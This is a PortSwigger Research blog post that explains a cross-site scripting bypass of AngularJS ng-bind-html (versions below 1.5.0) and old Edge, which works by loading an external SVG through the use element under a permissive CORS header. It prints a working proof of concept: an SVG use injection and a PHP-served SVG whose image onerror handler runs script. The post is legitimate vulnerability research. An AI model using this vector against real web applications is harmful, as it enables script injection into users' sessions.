---
source: portswigger-research
source_url: https://portswigger.net/research/bypassing-angularjs-bind-html
title: "Bypassing AngularJS bind HTML | PortSwigger Research"
published: 2019-11-07T14:51:15
description: "Whilst testing an internal SVG cleaner I spent some time looking at the use element. Basically it allows you to reference other SVG elements and include them in your SVG document. You can reference sa"
---

# Bypassing AngularJS bind HTML

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Thursday, 7 November 2019 at 14:51 UTC

- **Updated:** Tuesday, 8 September 2020 at 12:23 UTC


![AngularJS bind html bypass](https://portswigger.net/cms/images/01/67/dfe1999c1f3f-article-bypassing-angular-js-bin-html-article.png)

Whilst testing an internal SVG cleaner I spent some time looking at the `use` element. Basically it allows you to reference other SVG elements and include them in your SVG document. You can reference same-origin URLs or link to certain IDs on the page using the hash. I reported this issue internally but it was rejected as you needed to upload a SVG to the same origin in order to exploit it. So of course my next idea was to get it working cross-origin. Chrome, Firefox and Safari all prevent SVG from being included cross-origin. Old Edge was different though, it was possible to include SVG from a different origin provided you include the [CORS](https://portswigger.net/web-security/cors) header Access-Allow-Cross-Origin: \*. Initially I included a JavaScript URL in my external SVG and although the element was clickable the JavaScript URL didn't call `alert`.

I modified the file and tried injecting a `onclick` event and to my surprise the `onclick` event fired from the external domain. I double checked that the domain was the target domain by calling `alert(document.domain)` and thankfully it showed the correct domain. I then discovered you could modify the external SVG and make the vector execute automatically without a click using the `image` element.

The injection was:

`<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" />`

Here's what the external SVG looks like:

`<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: image/svg+xml");
?>
<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'>
<image href="1" onerror="alert(1)" />
</svg>
`

I then tested [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) and it worked there too as they allow SVG in versions <1.5.0. Here is the full proof of concept that works on AngularJS 1.4.9.

[AngularJS ng-bind-html bypass proof of concept.](http://portswigger-labs.net/use_element)

Note that later versions of AngularJS are not vulnerable as they do not allow SVG.

[angularjs](https://portswigger.net/research/angularjs) [ng-bind-html](https://portswigger.net/research/ng-bind-html) [XSS](https://portswigger.net/research/cross-site-scripting-research) [SVG](https://portswigger.net/research/svg)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes** 03 September 2025Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) [**Stealing HttpOnly cookies with the cookie sandwich technique** 22 January 2025Stealing HttpOnly cookies with the cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) [**Bypassing WAFs with the phantom $Version cookie** 04 December 2024Bypassing WAFs with the phantom $Version cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) [**Concealing payloads in URL credentials** 23 October 2024Concealing payloads in URL credentials](https://portswigger.net/research/concealing-payloads-in-url-credentials)